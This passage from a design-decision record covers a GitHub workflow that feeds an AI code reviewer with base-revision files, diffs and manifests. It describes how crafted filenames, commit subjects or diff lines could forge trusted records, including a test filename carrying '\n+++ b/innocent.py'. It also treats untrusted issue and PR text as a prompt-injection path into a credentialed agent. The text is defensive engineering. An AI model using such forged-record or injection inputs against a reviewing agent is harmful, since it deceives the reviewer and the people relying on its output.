   and ignored `X-RateLimit-Reset`, landing both attempts back inside the window, which
   GitHub warns can escalate a secondary limit. The comment introducing the read
   claimed to be the body's only consumer; it was not. The prefix is cached on the
   error so the two calls cannot disagree.

   And it named exception *members* rather than base classes, which this Decision
   already records as a mistake made four times on the request path.
   `http.client.IncompleteRead` is an `HTTPException` and neither an `OSError` nor a
   `ValueError`, so a truncated error body escaped the classification, the retry and
   the per-file recovery and ended the collection. Deciding what an error was may never
   be the thing that fails.

   Three reviewers found these independently, and all three are the same shape: new
   code on an old path does not inherit the path's invariants by being near them.

   **The revision identity is checked once, before any request.** `base_endpoint`
   refuses a base that is not an exact 40-character revision, and the per-file handler
   catches `ValueError` as an unusable *pathname* -- so a comparison that omitted
   `merge_base_commit.sha` produced a manifest blaming every ordinary filename in the
   change for a gap that was the provider's, while the preamble introduced the source as
   merge base "(unknown)". It is now a single `provider-error` against
   `comparison.json`, every hunkless entry is `unclassified-no-base-record`, and **no
   request is made at all**: without the revision there is no endpoint to ask, so the
   alternative was 300 identical refusals. The preamble prints `unknown` for any
   identity that is not exact rather than echoing a malformed one.

   Two verdicts survive that failure because they never needed the revision: an `added`
   entry is settled by the comparison alone, so it keeps `added-by-candidate` and, when
   hunkless, `added-without-hunks`. The first version of this branch discarded the whole
   list and hid them behind the generic error. And every other path is named
   individually -- `base.manifest` promises provenance per path, and a single summary
   record reported `Unavailable: 1` for a change where nothing at all was fetched,
   naming none of the files it happened to.

   Adding those per-path records then made the summary lie the other way. The
   comparison-level diagnostic shared the list `Unavailable:` counts, so four files
   without bytes were reported as five. A notice about the **collection** is not a
   path, belongs in the manifest and not in a count of paths, and is kept in its own
   list. That is the same defect as counting a copy as a rename: a number in the line
   the reviewer is told to trust, describing something it does not measure.

   **The root listing URL carries a trailing slash, and that is now load-bearing.**
   `listing_endpoint` builds `/contents/?ref=...` for the repository root. Since no
   redirect is followed any longer, a provider answering that form with a 3xx would make
   every root-level path unavailable, and silently: `base/` would simply lose those
   files. Measured against the live API rather than assumed -- both `/contents/?ref=`
   and `/contents?ref=` return 200 with the same listing and no `Location` header -- so
   the form is served directly and a reported mismatch there does not hold. The
   end-to-end test over real HTTP now collects a root-level file as well as one in a
   directory, because the risk is real even where the mechanism is not: the consequence
   of that behaviour changing is severe and produces no error.

   **Guarding this document's own text took four attempts, and the failures are worth
   recording.** Claims that a provider response establishes absence were found five
   times in five different wordings. Pinning the literal phrasings missed the next one.
   Enumerating the predicates that make the claim was the same mistake with a longer
   list, and missed a sentence calling a not-found response "the only \"absent\"
   answer". Requiring a negation nearby fails, because that sentence contains "never".
   Requiring exactly one such sentence fails, because this Decision legitimately
   narrates its own corrections and five sentences mention both terms. What holds is an
   asymmetry: the ways to make the claim are an open set, while the markers that say
   "this is history, or a denial" are a small set this document controls -- so every
   sentence joining the two terms must carry one, and a fresh claim carries none. Even
   that passed once for the wrong reason, because the marker `first` matched "on the
   first attempt" inside the offending sentence; a marker has to be a phrase that can
   only be retirement. A guard over prose must be shown to reject the known-bad
   sentence, not merely to pass -- and this paragraph is written in the guard's own
   terms for the same reason, since describing the rule in the rule's forbidden shape
   would trip it.

   The guard also covered the wrong surface. It read this record and not the collector,
   where the same superseded claim was sitting in a docstring and three comments -- and
   the source is what a maintainer changing that path reads first. It now reads both. A
   `.py` file's prose is its comments and docstrings, extracted with `tokenize` and
   `ast`: splitting the whole file into sentences ran code and comment text together and
   reported four such fragments as claims, which is a guard generating its own false
   findings.

   **The reviewer's instructions carry no elision.** The prompt read "report
   content-changed-without-hunks as not examined, and metadata-only when
   patches-source is present". The verb phrase is elided in the second clause, and a
   reader can take it as "report metadata-only entries" rather than "report them as
   not examined" -- one reviewer did. The cost is a report claiming a mode change was
   checked when the assembled per-file hunks carry no mode lines and the reviewer has
   nothing to contradict it with. The clause is now written out. It fits inside rule
   3's 4096-byte bound because "Say which" was removed as a duplicate of "State
   plainly what you did not examine" rather than by raising the bound; a prompt
   compressed until its grammar is ambiguous has spent the budget on nothing.

   **A copy is not a metadata-only change.** A copy is fetched under its previous path,
   so an exact copy makes the comparison's blob id equal the listing's and read as
   `metadata-only` -- said about a path that held nothing before, where a whole file
   appeared. It is the removal trap from the other side, and is labelled
   `copied-without-hunks`. A rename stays `metadata-only`: the file moved rather than
   multiplied, and the manifest lists that mapping separately.

   That label was first returned for **every** copy, which denied the other case. A copy
   can be edited: the provider reports `copied` with a destination blob differing from
   the source, the bytes collected into `base/` are the source's, and no artefact showed
   that the destination content had changed -- so the reviewer was not told to report it
   as unexamined. Only an exact copy, with two well-formed and equal identities, is
   `copied-without-hunks`; an edited one falls through to the ordinary comparison and is
   `content-changed-without-hunks`, which the prompt already requires to be reported as
   not examined. That reuse is deliberate: a new label would have needed new prompt
   bytes against rule 3's bound for a case the existing instruction already covers. A
   malformed pair remains `unclassified-without-blob-identity`, and the copy mapping is
   listed in all three.

   **An added file with no hunks is not examined either.** Its bytes are in no artefact
   at all: `base/` holds nothing for it because the candidate added it, and the fallback
   diff carries a `/dev/null` header and no content. The instruction named
   `content-changed-without-hunks` and `metadata-only` only, so a reviewer could finish
   without disclosing that newly added content was never seen.

   Saying so cost prompt bytes that rule 3's bound did not have -- the prompt was at
   4090 of 4096. It was not raised. The room came from a sentence that explained *when*
   paths are git-quoted, where the reviewer needs only the guarantee that a name cannot
   start a line; the condition is explanatory and the guarantee is what it acts on. The
   compression that bought the rest also broke two existing contract tests by shortening
   wordings they pin, and that was given back rather than absorbed by loosening them: a
   test that pins a phrase is the record of why the phrase is there, and editing it to
   fit a later sentence spends the guarantee to buy the space.

   **Transient provider failures are retried inside the collection too.** The step
   retries its own requests, but the collection makes one listing request per changed
   directory plus one contents request per changed file -- up to `FILE_CAP` of them --
   so a single 502 or timeout anywhere in that sequence ended the step and cost the
   whole review, with the risk growing as the Pull Request grew. Server errors, rate
   limits, transport failures and malformed bodies are retried (a malformed body that
   persists is a `provider-error`, as above); a 404 is the internal transport sentinel
   for "the provider answered not-found" and settles nothing about the repository, and
   everything else still propagates on the first attempt, so a refusal can never be
   mistaken for "the candidate added this file" -- which the comparison alone decides.

   **Nothing raw leaves the request path.** The per-file handler used to name each
   escaping exception type, so every type it did not name still cost the whole review:
   the `HTTPError` escape was closed and a timeout, a DNS failure, a reset connection or
   an `IncompleteRead` outlasting the retries was left to end the step with no manifest
   written. Enumerating types in the handler is the wrong shape -- it fails open on
   whatever is not listed. The request path converts instead: every failure that
   survives its retries arrives as this module's own error, carrying its cause, and the
   handler has one thing to know. The conversion names **base classes**, not members:
   `OSError` and `http.client.HTTPException` between them are every way a request can
   fail below the protocol -- `URLError`, `ConnectionError`, `TimeoutError` and the TLS
   errors are all `OSError`, and `IncompleteRead` is an `HTTPException`. Listing the
   types individually missed one four separate times, the last being a TLS failure
   during the body read; an enumeration fails open on whatever is not in it, which is
   the wrong direction for this surface.

   **The collector never waits past the budget by more than one floor.** That bounds
   the wait, not the network: an abandoned worker can keep its socket past the
   deadline until its receive ends, which is why their number is capped
   (`MAX_ABANDONED`, above; CodeRabbit, #330). One starting near
   the deadline was still given the full per-request timeout, and the body read was not
   deadline-aware at all, so the collection could pass the budget it states before it
   could record what it had not reached. Each request is given whichever is smaller --
   bounded below by `MIN_REQUEST_SECONDS`, since a timeout of zero would refuse a
   request the loop has already decided to make. That floor is the exact amount by
   which the deadline can be crossed, and the loop refuses to *start* a request after
   it, so the overshoot is one floor and no more. This paragraph previously said the
   bound held absolutely, which the floor makes false; the number is asserted in a
   contract test so the record and the code cannot drift apart again. The contract test drives each transport shape and a
   5xx through the real boundary rather than replacing the function that performs the
   conversion.

   **A no-hunk entry gets its verdict on every path.** The reviewer is sent to
   `base.manifest` for one, so an entry left out of it has no answer anywhere. Three
   paths skipped the classification -- the deadline check at the top of the loop, and a
   deadline or provider failure while fetching the listing -- and hunkless entries are
   ordered last, so on a large Pull Request they are precisely the ones the deadline
   reaches first: the guarantee failed where it was most needed. Each of those paths
   records `unclassified-no-base-record`, and the contract test also pins that exactly
   one verdict is written, so a later failure cannot add a second for an entry the
   listing had already classified.

   **A copy is mapped like a rename.** `base/` writes a copy's bytes under the
   destination, fetched from the source, so listing only renames in the mapping left
   those bytes with no record of where they came from -- the precise gap the mapping
   exists to close, opened by teaching the fetch about copies without teaching the
   manifest.

   **An unexpected response shape is that file's gap, not a crash.** A syntactically
   valid answer of the wrong shape -- a list where an object was expected -- reached
   `.get` and raised `AttributeError`, which no handler catches, so the collection ended
   before the manifest was written.

   **A request timeout bounds the exchange, not each receive.** A socket timeout limits
   one read; a provider sending a byte before each expiry keeps the response alive
   indefinitely while neither the request timeout nor the collection deadline fires.
   The body is read in chunks against an absolute stop, taken with `read1` where the
   response offers it: `read(n)` may perform several receives while trying to fill `n`,
   so a drip stays inside one call past every deadline, and a check between chunks is
   only a bound if each chunk is one receive.

   **The bytes are checked against the identity the listing gives.** `validate=True`
   only says the base64 was well formed; a truncated or corrupted payload that still
   decodes cleanly would be written as the exact pre-change file with no gap recorded,
   and "exact" is the whole claim `base/` makes. The parent listing already carries
   Git's blob id, so the decoded bytes are hashed the way Git hashes a blob -- SHA-1 of
   `blob <length>\\0` and the content, confirmed against `git hash-object` -- and a
   mismatch is recorded as `blob-mismatch` rather than written, and a listing that
   carries **no** blob id is `blob-unverifiable`: with nothing to check against, writing
   the bytes would make the exactness claim on evidence this collection does not have.
   Skipping the check when the field was missing was the same promise without the
   check. This turns "these are
   the exact bytes" from something the collection asserts into something it checks.

   **Decoding is strict.** `base64.b64decode` discards characters outside its alphabet
   by default, so a corrupt payload decodes to *some* bytes -- and those bytes would be
   written into `base/`, which the prompt calls the exact pre-change revision. The
   provider wraps its content in newlines, so whitespace is removed and everything else
   is then validated; a payload that fails is a recorded gap. A quiet wrong answer is
   worse than a missing one, which is the principle the whole collection is built on.

   **A write that fails leaves nothing behind.** The bytes go to a temporary name in
   `.base-staging`, beside `base/` and never inside it (rule 32), and are renamed into
   place only once they are all there.
   A half-written file would otherwise sit in `base/` looking exact while the manifest
   said the file was unavailable. The staging name is **unique**, not
   `<name>.partial`: that spelling is itself a legal pathname, so a Pull Request
   touching both `x.partial` and `x` would have the second write overwrite the first
   file and then rename it away -- a gap with no manifest line, still counted in
   `Written:`, which is exactly what the manifest exists to prevent.

   The retried failures include those raised **while the body is being read**.
   `urlopen` wraps connection errors only while it is making the request; a connection
   dropped during the read surfaces unwrapped, as `http.client.IncompleteRead` or
   `ConnectionResetError`. Retrying only what `urlopen` wraps left the review being lost
   to exactly the transport failure the retry was added to remove.

   **`base/` holds only the files this change touches**, and the prompt says so. An
   unchanged helper or caller is available only from the checkout, which is the default
   branch and may have advanced since the candidate diverged, so an interaction that
   turns on one is reported as not examined. Saying "everything about the change is
   here" without that qualification invited exactly the interaction findings that are
   not real. Supplying unchanged files at the merge base on demand is a capability with
   its own budget and failure modes, not a wording fix, and is not admitted here.

   A path this collection will not handle is likewise **that one file's gap, not the
   review's**. Names are still refused rather than sanitised -- a backslash is legal in
   a Git pathname and on the runner, and this collection still will not spell it on
   disk -- but the refusal used to be raised out of the step, so one odd filename
   anywhere in the Pull Request cost the entire review. Every refusal inside the
   per-file work says "this path cannot be handled", including a provider record that
   contradicts its own contract, and each is recorded as `unsupported-path` with its
   reason.

   A write that cannot land is a **recorded gap rather than a failed step**. Replacing
   a file with a directory is an ordinary change -- remove `cfg`, rename something to
   `cfg/x.py` -- and because every entry is written under its post-change name, one of
   those two writes meets the other as the wrong type. Letting that error escape would
   fail the collection and leave the Pull Request with no review at all, which is the
   failure this whole Decision exists to remove; it is recorded as `path-collision` in
   `base.manifest` instead, and any other failed write as `write-failed` (rule 34).
   This is the general rule for this collection: a file whose
   bytes cannot be obtained is named with its reason, and nothing about one file's
   absence may cost the reviewer the rest of the change.

   `metadata-only` is a weaker statement than an earlier revision of this Decision made
   it. It says the *content* is unchanged; it does not say **which** metadata changed.
   A `100644 -> 100755` and any other type or mode transition are carried by the unified
   diff's `old mode`/`new mode` lines and by nothing else collected here -- `diff.stat`
   has no mode, and `base/` preserves bytes rather than metadata. So when the provider
   refuses the unified diff and `patches-source` marks the assembled fallback, those
   lines are absent and a `metadata-only` entry is **not examined either**. Calling it
   reviewable on that path was the same false-claim defect this rule already records
   twice: the reviewer would have been asked to confirm a change it had no way to see. A **removal** is excluded from that comparison: the
   comparison's `sha` for a removed entry *is* the deleted base-side blob, so it always
   equals the listing's, and comparing them would label a deletion `metadata-only` and
   have the reviewer treat a deleted file as reviewable metadata. It is labelled
   `removed-without-hunks` instead. Classification happens **before the contents fetch
   and regardless of whether the bytes are written**, so a budget rejection or a decode
   failure cannot leave the reviewer without a verdict on whether content changed. Not
   before *any* fetch: it needs the directory listing, since blob identity is what
   distinguishes the cases. A listing that fails, or a deadline reached before it, gives
   `unclassified-no-base-record` -- and saying "before any fetch" promised a verdict in
   exactly the cases the collector states it cannot reach.

   Such an entry is also no longer skipped by the collection. A mode change or a pure
   rename of a text file has pre-change bytes, and those bytes are exactly what the
   prompt sends the reviewer to `base/` for; skipping them left no content and no
   recorded gap for a change the prompt had just called reviewable. Entries carrying
   hunks are fetched first, so a large binary cannot consume the budget ahead of the
   textual change the review is about, and the budget is checked against the **size the
   listing already reports** so a file the budget will reject costs no request at all.
   Fetching first made a large Pull Request full of binaries issue an avoidable request
   per file, and a rate-limit response there would fail the step -- leaving that Pull
   Request without a review, which is precisely the failure this Decision exists to
   remove.

   One committed script, `.github/review-context/build_review_context.py`, derives
   `diff.stat`, `no-patch.txt` and `base/` from a single comparison payload. That
   keeps the comparison to one request and keeps the step free of an external `jq`,
   and it puts the field semantics somewhere the suite can exercise directly.

   A **copied** entry is treated exactly as a renamed one. GitHub reports `copied`
   with a `previous_filename` too, and the source is the one thing a copy is about:
   without it the fallback claims the destination existed on the base side and no
   summary says where the content came from.

   `base/` holds the **exact pre-change bytes of the changed files it could fetch**,
   as the provider supplied them; the rest are named in `base.manifest` with
   their reason. It is not every changed file, and the collector's own vocabulary says
   so -- `added-by-candidate`, `over-budget`, `not-a-plain-file`, `blob-unverifiable`
   and `blob-mismatch` each name a changed file whose bytes are not there. Claiming
   otherwise invites a reader to take an absent file for an absent *change*, which is
   the false provenance this collection exists to prevent. Four properties of that collection are load-bearing, and
   each exists because getting it wrong hands the reviewer something *false* rather
   than something missing: the revision fetched is the **merge base**, since a
   three-dot comparison is computed from there and the base branch tip would be a
   different revision whenever the target branch has advanced; a **renamed or copied** entry is
   fetched under `previous_filename`, because that is where the base holds it and
   fetching the new path could return whatever unrelated file a swap or overwrite
   rename replaced -- and the old path is kept in every retained artefact, since bytes
   written under a new name with no record of where they came from leave the reviewer
   unable to reason about precisely the swap and overwrite cases the rename handling
   exists for: `diff.stat` shows `old -> new`, the assembled fallback diff uses
   `--- a/<old>` against `+++ b/<new>`, and `base.manifest` lists the mapping; a path's real type is read from its **parent directory listing**, not
   from the shape of the contents response, because the contents API answers a symlink
   to a regular file with the target's bytes under an ordinary `type: file` -- so a
   symlink, a submodule, or a large file returned with `encoding: "none"` is recorded as
   unavailable rather than written, and resolved or empty bytes are never presented as
   the exact base; and **no provider response establishes absence at all**. That is
   settled by the comparison: `status == "added"` yields `added-by-candidate`, and it
   is the collector's only statement that the base does not hold a path. A 404 is this
   path's transport sentinel and nothing more -- every provider failure, including a
   404 on the listing or on the contents, is a `provider-error`. So is a contents
   response the collector cannot read -- the wrong shape, no base64 string, or base64
   that will not decode: that says the answer was unusable, not that the base holds
   anything other than a plain file. `not-a-plain-file` is kept for the two causes the
   response does establish, a declared non-file type and the `encoding: "none"` an
   oversized blob comes back with. The same holds one step earlier, for the parent
   directory listing: only a recognised non-file type (`dir`, `symlink`, `submodule`)
   is a repository fact; a missing, emptied or unknown type is a `provider-error`. An earlier revision
   of this rule made a 404 the evidence; that is recorded with the absence contract
   below.

   That invariant used to be kept by letting the failure **end the step**. It is kept
   now by naming the failure for the file it happened to -- `provider-error` with its
   status -- because ending the step cost the whole review for one unlucky file, which
   is the outcome this collection exists to prevent. The distinction the rule protects
   is between "the base does not hold this" and "we could not ask", and a labelled
   record draws it at least as sharply as an aborted job did. This is a deliberate
   change to what an earlier revision of this rule required, not an oversight. Every
   path **the provider listed** and this collection did not write is named with its
   reason in `base.manifest` -- see rule 31: a capped comparison never sends the later
   paths at all, so they cannot be named here, and the manifest says so instead of
   implying it has them. `base.manifest` lives **outside** `base/` so it
   cannot overwrite a repository file of the same name. It exists because the checkout is the default branch and
   not this Pull Request's base (rule 21), so unchanged code read from disk can come
   from a revision the candidate never saw -- which yields interaction findings that
   are not real. Writing bytes rather than checking out a tree keeps rule 21 intact:
   no mode, symlink or directory entry from either side reaches the runner. Names are
   validated before use, and anything absolute, empty, traversing or containing a
   backslash or NUL is refused rather than sanitised, because a name that should not
   occur is a reason to stop. The endpoint each file is fetched from is **constructed**
   from the repository, the validated path and the exact base SHA rather than taken
   from the comparison's own `contents_url`: that field is provider-supplied data, and
   letting it choose the URL would let it choose where the request and its
   `Authorization` header go. (The first version passed the endpoint to a subprocess,
   where a leading dash would have been read as a flag; the next paragraph records
   its removal.) The repository must match `owner/name` with each
   side starting alphanumeric, the revision must be an exact 40-character lowercase
   hex SHA, and the path is percent-encoded. The URL is then matched, **at the point of
   use**, against a pattern that pins scheme, host and shape together: trusting a value
   because an earlier function was careful is how the first version of this check came
   to accept a leading dash, and validating before any environment lookup keeps "is
   this input acceptable" independent of "is the environment configured".

   There is no subprocess in this script at all. The request is an ordinary HTTPS GET,
   so no argument can be mistaken for a flag and no other origin is representable. That
   replaced an earlier version that shelled out to the provider CLI; two scanners
   flagged the argument as tainted, and although the validation was by then real, a
   sink that cannot take a flag is better than a sink whose arguments must be policed. The collection is bounded by the same byte budget, and
   a file that is absent -- added by the candidate, or over the budget -- is recorded
   with its reason in `base.manifest` rather than left to look like an empty file.

   **Every path is quoted before it enters one of these artefacts.** Git permits a
   newline in a pathname and the comparison carries it through as JSON, while every
   artefact here is read line by line -- so a name interpolated verbatim could add a
   `+++ b/other.py` header, a diff line, or an extra `diff.stat` record, and make
   unrelated text look like a change to a different file. The same applies to
   `base.manifest`, which the prompt tells the reviewer to trust for the hunkless
   classification: an unquoted name there could add a record reading
   `metadata-only critical.bin` that the collector never wrote. The reviewer has no git and
   no candidate tree, so it has nothing to check that against. The quoting is the one
   `git -c core.quotePath=false` uses: control characters, a double quote and a
   backslash are C-quoted, and ordinary UTF-8 is left alone, because a legitimate
   international filename is not a line-injection risk and quoting it would only make
   the artefacts harder to read. Quoting rather than refusal, because such a
   name is a legal path and dropping the file would hide a real change. The contract
   test builds the artefacts from a comparison whose filename carries
   `\n+++ b/innocent.py` and asserts no forged line reaches the start of a line in any
   artefact.

   Git's rule alone is **not sufficient**, and this is the one place this Decision
   deliberately goes beyond it. `git -c core.quotePath=false` prints U+0085, U+2028 and
   U+2029 raw -- verified against Git itself -- because Git orients on bytes. These
   artefacts are read by a Unicode-aware reader, and Python's `str.splitlines`, which
   the reviewer's tools use, treats all three as line breaks, so a name carrying one
   recreated exactly the forged-record problem the C0 quoting closed. They are escaped
   too, as the octal of their UTF-8 bytes, which is how `git -c core.quotePath=true`
   renders a non-ASCII byte: the escape stays in Git's own vocabulary even where Git
   itself does not apply it. A record longer than the reviewer's readable line
   (`chunk_diff.LINE_CAP`) is hard-wrapped in every summary artefact, as the diff is:
   each record begins with a status word, so a line beginning with `>` can only
   continue the record above it. A long path had made its record unreachable at the
   tail (Codex, #330). A lone surrogate is escaped the same way, as the octal of
   its `surrogatepass` bytes. Valid JSON can carry one (`"\ud800"`), and no UTF-8
   writer can encode it, so the first summary write raised before the per-file
   isolation existed and one such name cost the whole collection (Codex, #330). Every
   artefact writer is also total over provider text: a surrogate in a `patch` is
   written as its backslash escape rather than raising. And `no-patch.txt` prints a
   short blob id only for a well-formed blob id, `?` otherwise, because a `sha`
   carrying a newline had added a record of its own.

   **A commit subject is candidate-controlled text too**, and `commits.log` is read
   line by line like every other artefact here. Splitting a message on `\n` in the step
   left a Unicode line separator intact, so a subject could add a standalone fake commit
   -- or a fake `[provider listed ...]` notice -- to a file the reviewer trusts.
   Subjects are therefore carried base64-encoded out of the provider request and
   rendered by the same committed script, through the same escaping as a pathname. The
   cap notice is appended after that rendering, so the count it states is a count of
   records the reviewer will actually read. One undecodable subject is that commit's
   gap, recorded as `[subject unavailable]`, not the step's failure.

   The prompt asks for **no verdict these artefacts cannot support**. A real unified
   diff separates a binary content change from a mode-only one, by its mode lines and
   its binary notice; the assembled fallback carries neither, so when `patches-source`
   is present the honest answer is "not examined" rather than a guess. Demanding
   "report which" unconditionally was the same false-claim defect this rule records
   elsewhere, in the one place the reviewer would have had to invent an answer.

   The provider requests are **retried a bounded number of times**. They ran unguarded
   under `set -eu`, so one transient 5xx ended the step, the reviewer never started, and
   the Pull Request got no review -- this Decision's own failure mode, reached by a
   transient error rather than by size. Each attempt writes to its own file and is moved
   into place only on success, so a partial body is never left behind nor appended to by
   the next attempt. A persistent failure still stops: there is nothing to review
   without the comparison, and a silent partial context would be worse than a visible
   red check.

   **Non-LF line separators inside a diff record are escaped.** A changed line may
   legally contain a lone CR or U+0085/U+2028/U+2029, while this splitter and Git orient
   on LF, so a record carrying `+++ b/forged.py` after one of them appeared to a
   Unicode-aware reader as a standalone file header -- the forgery closed for pathnames
   and commit subjects, reappearing in the diff body itself. They are escaped to their
   octal UTF-8 bytes, as pathnames are, and `patches/README` says how many and why. A CR
   directly before an LF is a Windows line ending rather than a separator of its own and
   is left alone -- matched directly, as a CR not followed by an LF, rather than by
   swapping CRLF for a placeholder and back: a placeholder the input can itself contain
   turns the candidate's own bytes into a CRLF the diff never had. `patches/README`
   lists every escaped form against what it stands for, because a disclosure naming
   four of nine sends the reviewer to a note that does not describe what was done.
   This is the one substitution the parts carry: they are otherwise byte-for-byte, and
   the README distinguishes the two.

   **Bytes that are not valid UTF-8 are escaped by the same rule.** A Latin-1 source
   file without NUL bytes is a text diff to the provider, and its octets passed raw
   into every part that held them, which the reviewer's text reader cannot decode --
   so with no candidate tree the hunk was unreviewable while the prompt said the
   whole diff was reachable. Each such byte is written as its octal value, after every
   literal backslash is doubled, so one reversal undoes separators and octets alike
   and a corpus over both stays injective. The README and the overview count them,
   and the README says the file's real encoding is not known here, so the escapes are
   bytes, not characters to be read. Valid UTF-8 is untouched.

   **A one-sided change names the nonexistent side `/dev/null`**, as unified diff does.
   Writing `--- a/<name>` for an added file tells a reviewer with no tree and no base
   that the file existed before the change, and on the assembled fallback that header
   is the only description of it the reviewer gets.

   The parts are also **hard-wrapped** at a reader-visible line length. Fixing the
   UTF-8 split was not sufficient: the reviewer's `Read` truncates a physical line
   beyond roughly two thousand characters and indexes by line, so a minified or
   generated record would leave its tail unreachable while the prompt claimed
   `patches/` holds the whole diff. No byte is removed or reordered, and each continuation line is
   marked with a character that never begins a line of unified diff output: without it
   a segment starting with `-` or `+` would read as a deletion or an addition, and one
   starting with `+++ b/` as a different file, so the reviewer could attribute content
   to the wrong side of the change. The wrapping, its count and the marker's purpose are
   disclosed in `patches/README`, together with the consequence for line numbering: a
   wrapped record occupies several displayed lines, so counting lines within its hunk
   no longer matches the file's own numbering, and a finding there cites the hunk
   header with the line number called approximate.

   The bound notice follows the **number of parts produced**, not the size of the
   input, and the chunker writes `diff.patch` itself for that reason. A diff that fits
   the bound until wrapping pushes it past would otherwise be split into parts while
   `diff.patch` claimed to be the whole thing -- the reviewer would finish without ever
   learning a tail existed.

   The notices come **out of the same bound**, not on top of it. Taking a whole part
   as the overview and appending afterwards let `diff.patch` exceed the very number it
   prints -- an artefact asserting something false about itself, which is the defect
   class this rule keeps closing. The overview is therefore a line-boundary prefix
   sized with its notices rather than part one verbatim; it is still whole lines, so it
   still decodes as text, and if reserving that room is what makes it short, it says it
   is bounded and points at `patches/` like any other truncation. A bound too small
   for the notices themselves is **refused**, like a bound too small for one
   character: the body was cut to nothing and the notices appended anyway, so the
   file still exceeded its number, and cutting the notices instead would drop the
   disclosures. The workflow's 512 KiB cannot reach it; the contract is the
   chunker's, and a suite that tested parts at 64 bytes had been exercising the
   over-bound overview without looking at it.

   **Wrapping is disclosed on its own**, whenever a record was wrapped, and not only
   when the size bound was also crossed. A diff holding one very long record can fit in
   a single part, and then `diff.patch` carried inserted newlines and continuation
   markers with nothing saying they are synthetic: the reviewer would read them as real
   diff content and compute line numbers from them. Tying the disclosure to the bound
   notice also hid the pointer to `patches/README`, where the consequence for line
   numbering is explained -- so the one case that most needs the rule was the one case
   that never received it.

   A refused diff does not fail the step, and does not leave the reviewer without the
   change either. The provider can decline the diff of a very
   large comparison, and exiting there would reproduce the large-Pull-Request failure
   this Decision exists to remove. The per-file patches assembled from the same comparison
   payload take the unified diff's place, so **the hunks the comparison carried** remain
   reachable; `patches-source` says so, and says that context outside each hunk is
   absent. Writing only a notice would have let a review complete without ever seeing
   the change.

   The fallback is deliberately lossy, and this Decision may not describe it as
   complete. The per-file patches hold what the comparison payload actually carried and
   nothing else, so two classes are absent from `assembled.diff` by construction: files
   beyond the provider's changed-file cap, which are never sent at all, and entries with
   `patch: null` -- a binary or oversized blob -- whose bytes are in neither the payload
   nor the checkout. The artefacts already say so per case (`diff.stat`'s cap notice,
   `no-patch.txt`, and the reviewer's instruction to report such an entry as not
   examined), and stating a stronger guarantee here would invite a maintainer to treat
   a knowingly partial review as a complete one -- which is the failure this whole
   Decision is written against.

   The parts are cut by a second committed script,
   `.github/review-context/chunk_diff.py`,
   rather than by coreutils. Line boundaries are still preferred, but a single line
   longer than the bound must be cut somewhere, and the record mode of `split` cuts it
   by bytes -- halving a multibyte character and leaving two parts a text reader
   cannot decode. The script retreats off any UTF-8 continuation byte instead. A bound
   that cannot hold a single character is **refused rather than papered over**: that
   retreat previously fell back to the raw limit on reaching the start of the buffer,
   splitting the very character it exists to keep whole, silently. That is a
   configuration error and now says so. A non-positive bound is different and stays
   legal -- it is what the overview asks for when its notices already fill the limit,
   and the answer there is "no room", not an error. Being
   committed, it comes from the default branch exactly as this workflow does, and the
   suite exercises it directly rather than by extracting it from YAML. The bound on `diff.patch` is deliberate: an
   unbounded diff would reintroduce the context exhaustion this Decision exists to
   remove. Bounded must not mean unreachable, though. With no git, a reviewer
   cannot recover a deletion that falls past the cutoff and the checkout no longer
   holds the removed content, so the whole diff is also written as fixed-size parts
   under `patches/`, read in name order. "Whole" means all of what was collected:
   when the provider refuses the unified diff, that is per-file hunks assembled from
   the comparison, which can omit files past its cap and entries with no patch, so
   neither the prompt nor the overview calls `patches/` the whole change. Those parts are split on line boundaries
   under the byte bound rather than at exact byte counts, because the reviewer reads
   them as text and a byte cut can leave a multibyte character split across two
   files; the overview is cut on the same line boundaries for the same reason. The reviewer therefore pages the diff by
   its own choice, which is what bounded context is supposed to mean. Item type is
   keyed on the resolved pull number here too, never on head/base equality, and an
   emptied Pull Request still receives every artefact the prompt names. The
   contract test executes the step, checks each artefact, the bound, the emptied
   and no-Pull-Request paths, asserts the concatenated parts equal the full
   `git diff`, and asserts the step interpolates no event data.

13. Requests with **no Pull Request** are answered from the repository rather than
   from a diff. `issues: opened` stays an admitted trigger under Decision 0093
   rule 7, and there the resolved base equals the head, so a diff-shaped
   instruction would compare nothing. The prompt shows both SHAs so the
   distinction is observable rather than implied.
14. Inline review location is forwarded. On `pull_request_review_comment` the
   meaning of a request often lives in the comment's path, line and hunk rather
   than its body, and agent mode fetches none of it.

    *Withdrawn by Decision 0096 rule 13.* Inline review comments no longer start a review, so there is no inline location to forward, and admission writes no `request/inline`.

15. **Externally authored issue text is withheld.** The job gate validates the
   replying author's association, not the issue author's. Since this job holds the
   Claude credential, grants `Read`, and publishes its answer in a public step
   summary, an external issue body would otherwise be an injection path into a
   credentialed agent with public output. The issue body and title are interpolated
   only when the issue author is `OWNER`, `MEMBER` or `COLLABORATOR`, and the prompt
   says so where the text would have been. The Pull Request body needs no separate
   gate: rule 9 already refuses a fork-controlled head, so a reviewed Pull Request
   is authored inside this repository -- but its *description* need not be. The gate
   therefore keys on the author's association for **both** payload shapes -- the
   issue body and title on `issue_comment`, and the Pull Request body on the review
   triggers -- with no exemption for a Pull-Request-backed issue payload. Gating one
   shape and leaving the other open closes nothing.

   Two reviewers took opposite positions here and both were right. Exempting Pull
   Requests preserves the curated state for one opened by a bot or any account
   without a trusted association; not exempting them keeps untrusted description
   text out of a credential-bearing job that publishes publicly. Safety is chosen:
   **a Pull Request whose description is authored by an untrusted association loses
   its curated-state input**, and the prompt says so where the text would have been.
   The diff, the files and the request itself remain fully available, so the review
   is narrower rather than impossible.

    *Since Decision 0096 this holds through the relay:* admission withholds it, judging the item's author separately from the mention's.

16. **The tool grant and the requested permissions must agree.** `actions: read`
   installs nothing on its own; agent mode installs the CI server only when
   `--allowedTools` names an `mcp__github_ci` tool. The three read-only CI tools are
   granted so the permission is used, rather than left as dead configuration that a
   reader would mistake for capability.

17. The inline comment's **original** identity is forwarded alongside its current
   one. An inline thread carried forward after a push identifies the new head while
   its diff hunk can originate from an older commit, so without
   `original_commit_id` and `original_line` the reviewer cannot detect that it is
   interpreting the request against different code.

    *Withdrawn by Decision 0096 rule 13,* with inline review comments: there is no original identity to forward.

18. **The comparison follows a submitted review's commit, but not an inline
   comment's.** The wording matters: **nothing** makes the checkout follow a
   candidate commit. The checkout is bound to the workflow revision and to the
   protected branch (rules 21 and 25a), and the reviewed commit is used only as the
   *comparison head* from which the context artefacts are built. An earlier version
   of this rule said "the checkout follows", which contradicted rule 21's
   no-candidate-tree boundary outright and would have invited a maintainer to
   reintroduce the candidate checkout the rest of this Decision exists to remove.
   A push landing while an older *submitted review* is open leaves
